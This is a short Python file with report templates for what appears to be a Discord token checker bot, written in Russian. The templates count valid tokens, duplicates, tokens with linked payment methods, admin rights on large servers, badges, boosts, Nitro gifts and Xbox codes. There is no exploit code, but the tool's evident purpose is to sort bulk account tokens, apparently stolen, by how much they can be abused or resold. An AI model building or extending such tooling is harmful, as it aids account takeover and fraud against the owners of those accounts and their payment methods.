def token_checking_task_done(valid, invalid, count, duplicate, spam_count, empty_count, clean_count, payment_count,
                             admin_count, badges_count, boosts_count, xbox_codes_count, gifts_count, time):
    return f'''✅ Готово (заняло {time} секунд)!
    <b>Отчёт</b>:
✅ Валидных токенов - <code>{valid}</code>
❌ Невалидных токенов - <code>{invalid}</code>
💫 Всего - <code>{count}</code>
🔗 Дублей удалено - <code>{duplicate}</code>

✉️ Проспамленных - <code>{spam_count}</code>
💨 Пустых - <code>{empty_count}</code>
💎 Чистых токенов - <code>{clean_count}</code>
💳 С привязанными платежными методами - <code>{payment_count}</code>
👑 С админкой на крупных серверах (500+) - <code>{admin_count}</code>
🎖 Со значками - <code>{badges_count}</code>
🔮 С неиспользованными бустами - <code>{boosts_count}</code>

Чекер нашёл:
xbox codes - <code>{xbox_codes_count}</code>
nitros в gifts inventory - <code>{gifts_count}</code>
<i>p.s.: категории: проспамленные, чистые, и xbox_codes неверны!!</i>
'''


def dict_name_to_str(dict_name):
    dct = {'valid': '✅ Валидные токены', 'empty': '💨 Пустые', 'with_payments': '💳 С привязанными платежными методами',
           'with_admin_on_big_server': '👑 С админкой на крупных серверах (500+)', 'with_badges': '🎖 Со значками',
           'with_boosts': '🔮 С неиспользованными бустами', 'invalid': '❌ Невалидные токены',
           'spammed': '✉️ Проспамленные токены', 'clean': '💎 Чистых токенов', 'xbox_codes': 'Коды Xbox',
           'nitro_gifts': 'Токены с нитро в подарках', 'duplicates': 'Дубли'}
    return dct[dict_name]
